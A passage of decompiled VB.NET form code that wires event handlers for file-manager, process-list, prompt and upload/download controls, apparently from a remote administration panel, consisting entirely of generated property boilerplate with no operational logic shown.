            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CopyFileToolStripMenuItem_Click)
                If (Not Me._CopyFileToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._CopyFileToolStripMenuItem.Click, handler
                End If
                Me._CopyFileToolStripMenuItem = value
                If (Not Me._CopyFileToolStripMenuItem Is Nothing) Then
                    AddHandler Me._CopyFileToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CopyThisFolderToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._CopyThisFolderToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CopyThisFolderToolStripMenuItem_Click)
                If (Not Me._CopyThisFolderToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._CopyThisFolderToolStripMenuItem.Click, handler
                End If
                Me._CopyThisFolderToolStripMenuItem = value
                If (Not Me._CopyThisFolderToolStripMenuItem Is Nothing) Then
                    AddHandler Me._CopyThisFolderToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CreateNewFileToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._CreateNewFileToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CreateNewFileToolStripMenuItem_Click)
                If (Not Me._CreateNewFileToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._CreateNewFileToolStripMenuItem.Click, handler
                End If
                Me._CreateNewFileToolStripMenuItem = value
                If (Not Me._CreateNewFileToolStripMenuItem Is Nothing) Then
                    AddHandler Me._CreateNewFileToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CreateNewFileToolStripMenuItem1 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._CreateNewFileToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CreateNewFileToolStripMenuItem1_Click)
                If (Not Me._CreateNewFileToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._CreateNewFileToolStripMenuItem1.Click, handler
                End If
                Me._CreateNewFileToolStripMenuItem1 = value
                If (Not Me._CreateNewFileToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._CreateNewFileToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CreateNewFileToolStripMenuItem2 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._CreateNewFileToolStripMenuItem2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CreateNewFileToolStripMenuItem2_Click)
                If (Not Me._CreateNewFileToolStripMenuItem2 Is Nothing) Then
                    RemoveHandler Me._CreateNewFileToolStripMenuItem2.Click, handler
                End If
                Me._CreateNewFileToolStripMenuItem2 = value
                If (Not Me._CreateNewFileToolStripMenuItem2 Is Nothing) Then
                    AddHandler Me._CreateNewFileToolStripMenuItem2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CreateNewFileToolStripMenuItem3 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._CreateNewFileToolStripMenuItem3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CreateNewFileToolStripMenuItem3_Click)
                If (Not Me._CreateNewFileToolStripMenuItem3 Is Nothing) Then
                    RemoveHandler Me._CreateNewFileToolStripMenuItem3.Click, handler
                End If
                Me._CreateNewFileToolStripMenuItem3 = value
                If (Not Me._CreateNewFileToolStripMenuItem3 Is Nothing) Then
                    AddHandler Me._CreateNewFileToolStripMenuItem3.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CreateNewFolderToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._CreateNewFolderToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CreateNewFolderToolStripMenuItem_Click)
                If (Not Me._CreateNewFolderToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._CreateNewFolderToolStripMenuItem.Click, handler
                End If
                Me._CreateNewFolderToolStripMenuItem = value
                If (Not Me._CreateNewFolderToolStripMenuItem Is Nothing) Then
                    AddHandler Me._CreateNewFolderToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CreateNewFolderToolStripMenuItem1 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._CreateNewFolderToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CreateNewFolderToolStripMenuItem1_Click)
                If (Not Me._CreateNewFolderToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._CreateNewFolderToolStripMenuItem1.Click, handler
                End If
                Me._CreateNewFolderToolStripMenuItem1 = value
                If (Not Me._CreateNewFolderToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._CreateNewFolderToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property DeleteFileToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._DeleteFileToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.DeleteFileToolStripMenuItem_Click)
                If (Not Me._DeleteFileToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._DeleteFileToolStripMenuItem.Click, handler
                End If
                Me._DeleteFileToolStripMenuItem = value
                If (Not Me._DeleteFileToolStripMenuItem Is Nothing) Then
                    AddHandler Me._DeleteFileToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property DeleteFolderToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._DeleteFolderToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.DeleteFolderToolStripMenuItem_Click)
                If (Not Me._DeleteFolderToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._DeleteFolderToolStripMenuItem.Click, handler
                End If
                Me._DeleteFolderToolStripMenuItem = value
                If (Not Me._DeleteFolderToolStripMenuItem Is Nothing) Then
                    AddHandler Me._DeleteFolderToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property DotNetBarTabcontrol1 As DotNetBarTabcontrol
            <DebuggerNonUserCode> _
            Get
                Return Me._DotNetBarTabcontrol1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As DotNetBarTabcontrol)
                Me._DotNetBarTabcontrol1 = value
            End Set
        End Property

        Friend Overridable Property DownloadFileToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._DownloadFileToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.DownloadFileToolStripMenuItem_Click)
                If (Not Me._DownloadFileToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._DownloadFileToolStripMenuItem.Click, handler
                End If
                Me._DownloadFileToolStripMenuItem = value
                If (Not Me._DownloadFileToolStripMenuItem Is Nothing) Then
                    AddHandler Me._DownloadFileToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FlatCloseSY1 As FlatCloseSY
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatCloseSY1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCloseSY)
                Me._FlatCloseSY1 = value
            End Set
        End Property

        Friend Overridable Property FlatGroupBox1 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox1 = value
            End Set
        End Property

        Friend Overridable Property FlatGroupBox2 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox2 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel1 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel1 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel2 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel2 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel3 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel3 = value
            End Set
        End Property

        Friend Overridable Property FlatMax1 As FlatMax
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMax1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMax)
                Me._FlatMax1 = value
            End Set
        End Property

        Friend Overridable Property FlatMini1 As FlatMini
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMini1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMini)
                Me._FlatMini1 = value
            End Set
        End Property

        Friend Overridable Property FlatStatusBar_IS As FlatStatusBar
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatStatusBar_IS
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStatusBar)
                Me._FlatStatusBar_IS = value
            End Set
        End Property

        Friend Overridable Property FlatStatusBar1 As FlatStatusBar
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatStatusBar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStatusBar)
                Me._FlatStatusBar1 = value
            End Set
        End Property

        Friend Overridable Property FlatStatusBarprocess As FlatStatusBar
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatStatusBarprocess
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStatusBar)
                Me._FlatStatusBarprocess = value
            End Set
        End Property

        Friend Overridable Property FormSkin1 As FormSkin
            <DebuggerNonUserCode> _
            Get
                Return Me._FormSkin1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FormSkin)
                Me._FormSkin1 = value
            End Set
        End Property

        Friend Overridable Property ImageList_FileManager As ImageList
            <DebuggerNonUserCode> _
            Get
                Return Me._ImageList_FileManager
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ImageList)
                Me._ImageList_FileManager = value
            End Set
        End Property

        Friend Overridable Property ImageList_Info As ImageList
            <DebuggerNonUserCode> _
            Get
                Return Me._ImageList_Info
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ImageList)
                Me._ImageList_Info = value
            End Set
        End Property

        Friend Overridable Property KillProcessToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._KillProcessToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.KillProcessToolStripMenuItem_Click)
                If (Not Me._KillProcessToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._KillProcessToolStripMenuItem.Click, handler
                End If
                Me._KillProcessToolStripMenuItem = value
                If (Not Me._KillProcessToolStripMenuItem Is Nothing) Then
                    AddHandler Me._KillProcessToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Label1 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As Label)
                Me._Label1 = value
            End Set
        End Property

        Friend Overridable Property ListBox_Software As ListBox
            <DebuggerNonUserCode> _
            Get
                Return Me._ListBox_Software
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ListBox)
                Me._ListBox_Software = value
            End Set
        End Property

        Friend Overridable Property listprocess As ListView
            <DebuggerNonUserCode> _
            Get
                Return Me._listprocess
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ListView)
                Me._listprocess = value
            End Set
        End Property

        Friend Overridable Property ListView1 As ListView
            <DebuggerNonUserCode> _
            Get
                Return Me._ListView1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ListView)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ListView1_Click)
                Dim handler2 As EventHandler = New EventHandler(AddressOf Me.ListView1_DoubleClick)
                If (Not Me._ListView1 Is Nothing) Then
                    RemoveHandler Me._ListView1.Click, handler
                    RemoveHandler Me._ListView1.DoubleClick, handler2
                End If
                Me._ListView1 = value
                If (Not Me._ListView1 Is Nothing) Then
                    AddHandler Me._ListView1.Click, handler
                    AddHandler Me._ListView1.DoubleClick, handler2
                End If
            End Set
        End Property

        Friend Overridable Property MoveFileToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._MoveFileToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.MoveFileToolStripMenuItem_Click)
                If (Not Me._MoveFileToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._MoveFileToolStripMenuItem.Click, handler
                End If
                Me._MoveFileToolStripMenuItem = value
                If (Not Me._MoveFileToolStripMenuItem Is Nothing) Then
                    AddHandler Me._MoveFileToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property MoveThisFolderToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._MoveThisFolderToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.MoveThisFolderToolStripMenuItem_Click)
                If (Not Me._MoveThisFolderToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._MoveThisFolderToolStripMenuItem.Click, handler
                End If
                Me._MoveThisFolderToolStripMenuItem = value
                If (Not Me._MoveThisFolderToolStripMenuItem Is Nothing) Then
                    AddHandler Me._MoveThisFolderToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property NewProcessToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._NewProcessToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.NewProcessToolStripMenuItem_Click)
                If (Not Me._NewProcessToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._NewProcessToolStripMenuItem.Click, handler
                End If
                Me._NewProcessToolStripMenuItem = value
                If (Not Me._NewProcessToolStripMenuItem Is Nothing) Then
                    AddHandler Me._NewProcessToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As PictureBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.PictureBox1_Click)
                If (Not Me._PictureBox1 Is Nothing) Then
                    RemoveHandler Me._PictureBox1.Click, handler
                End If
                Me._PictureBox1 = value
                If (Not Me._PictureBox1 Is Nothing) Then
                    AddHandler Me._PictureBox1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Prompt As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._Prompt
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._Prompt = value
            End Set
        End Property

        Friend Overridable Property RefreshToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RefreshToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RefreshToolStripMenuItem_Click)
                If (Not Me._RefreshToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RefreshToolStripMenuItem.Click, handler
                End If
                Me._RefreshToolStripMenuItem = value
                If (Not Me._RefreshToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RefreshToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RefreshToolStripMenuItem1 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RefreshToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RefreshToolStripMenuItem1_Click)
                If (Not Me._RefreshToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._RefreshToolStripMenuItem1.Click, handler
                End If
                Me._RefreshToolStripMenuItem1 = value
                If (Not Me._RefreshToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._RefreshToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RefreshToolStripMenuItem2 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RefreshToolStripMenuItem2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RefreshToolStripMenuItem2_Click)
                If (Not Me._RefreshToolStripMenuItem2 Is Nothing) Then
                    RemoveHandler Me._RefreshToolStripMenuItem2.Click, handler
                End If
                Me._RefreshToolStripMenuItem2 = value
                If (Not Me._RefreshToolStripMenuItem2 Is Nothing) Then
                    AddHandler Me._RefreshToolStripMenuItem2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RefreshToolStripMenuItem3 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RefreshToolStripMenuItem3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RefreshToolStripMenuItem3_Click)
                If (Not Me._RefreshToolStripMenuItem3 Is Nothing) Then
                    RemoveHandler Me._RefreshToolStripMenuItem3.Click, handler
                End If
                Me._RefreshToolStripMenuItem3 = value
                If (Not Me._RefreshToolStripMenuItem3 Is Nothing) Then
                    AddHandler Me._RefreshToolStripMenuItem3.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RenameFileToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RenameFileToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RenameFileToolStripMenuItem_Click)
                If (Not Me._RenameFileToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RenameFileToolStripMenuItem.Click, handler
                End If
                Me._RenameFileToolStripMenuItem = value
                If (Not Me._RenameFileToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RenameFileToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RenameFolderToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RenameFolderToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RenameFolderToolStripMenuItem_Click)
                If (Not Me._RenameFolderToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RenameFolderToolStripMenuItem.Click, handler
                End If
                Me._RenameFolderToolStripMenuItem = value
                If (Not Me._RenameFolderToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RenameFolderToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property rightclick_filemanagerfiles As ContextMenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._rightclick_filemanagerfiles
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ContextMenuStrip)
                Me._rightclick_filemanagerfiles = value
            End Set
        End Property

        Friend Overridable Property rightclick_filemanagerfolders As ContextMenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._rightclick_filemanagerfolders
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ContextMenuStrip)
                Me._rightclick_filemanagerfolders = value
            End Set
        End Property

        Friend Overridable Property rightclick_IS As ContextMenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._rightclick_IS
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ContextMenuStrip)
                Me._rightclick_IS = value
            End Set
        End Property

        Friend Overridable Property rightclick_nothing As ContextMenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._rightclick_nothing
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ContextMenuStrip)
                Me._rightclick_nothing = value
            End Set
        End Property

        Friend Overridable Property rightclickprocess As ContextMenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._rightclickprocess
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ContextMenuStrip)
                Me._rightclickprocess = value
            End Set
        End Property

        Friend Overridable Property rightclicksystem As ContextMenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._rightclicksystem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ContextMenuStrip)
                Me._rightclicksystem = value
            End Set
        End Property

        Friend Overridable Property rtb_prompt As RichTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._rtb_prompt
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RichTextBox)
                Me._rtb_prompt = value
            End Set
        End Property

        Private Overridable Property shareclient As WebClient
            <DebuggerNonUserCode> _
            Get
                Return Me._shareclient
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As WebClient)
                Dim handler As UploadProgressChangedEventHandler = New UploadProgressChangedEventHandler(AddressOf Me.shareclient_UploadProgressChanged)
                Dim handler2 As UploadFileCompletedEventHandler = New UploadFileCompletedEventHandler(AddressOf Me.shareclient_UploadFileCompleted)
                If (Not Me._shareclient Is Nothing) Then
                    RemoveHandler Me._shareclient.UploadProgressChanged, handler
                    RemoveHandler Me._shareclient.UploadFileCompleted, handler2
                End If
                Me._shareclient = value
                If (Not Me._shareclient Is Nothing) Then
                    AddHandler Me._shareclient.UploadProgressChanged, handler
                    AddHandler Me._shareclient.UploadFileCompleted, handler2
                End If
            End Set
        End Property

        Friend Overridable Property TabPage1 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage1 = value
            End Set
        End Property

        Friend Overridable Property TabPage2 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage2 = value
            End Set
        End Property

        Friend Overridable Property TabPage3 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage3 = value
            End Set
        End Property

        Friend Overridable Property TabPage4 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage4 = value
            End Set
        End Property

        Friend Overridable Property TabPage5 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage5 = value
            End Set
        End Property

        Friend Overridable Property TabPage6 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage6 = value
            End Set
        End Property

        Friend Overridable Property tb_path As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_path
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TextBox)
                Dim handler As KeyEventHandler = New KeyEventHandler(AddressOf Me.tb_path_KeyDown)
                If (Not Me._tb_path Is Nothing) Then
                    RemoveHandler Me._tb_path.KeyDown, handler
                End If
                Me._tb_path = value
                If (Not Me._tb_path Is Nothing) Then
                    AddHandler Me._tb_path.KeyDown, handler
                End If
            End Set
        End Property

        Friend Overridable Property tb_title As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_title
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Me._tb_title = value
            End Set
        End Property

        Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ToolStripMenuItem1_Click)
                If (Not Me._ToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._ToolStripMenuItem1.Click, handler
                End If
                Me._ToolStripMenuItem1 = value
                If (Not Me._ToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._ToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ToolStripMenuItem2 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ToolStripMenuItem2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ToolStripMenuItem2_Click)
                If (Not Me._ToolStripMenuItem2 Is Nothing) Then
                    RemoveHandler Me._ToolStripMenuItem2.Click, handler
                End If
                Me._ToolStripMenuItem2 = value
                If (Not Me._ToolStripMenuItem2 Is Nothing) Then
                    AddHandler Me._ToolStripMenuItem2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property TreeView1 As TreeView
            <DebuggerNonUserCode> _
            Get
                Return Me._TreeView1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TreeView)
                Me._TreeView1 = value
            End Set
        End Property

        Friend Overridable Property UploadFileToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._UploadFileToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UploadFileToolStripMenuItem_Click)
                If (Not Me._UploadFileToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._UploadFileToolStripMenuItem.Click, handler
                End If
                Me._UploadFileToolStripMenuItem = value
                If (Not Me._UploadFileToolStripMenuItem Is Nothing) Then
                    AddHandler Me._UploadFileToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

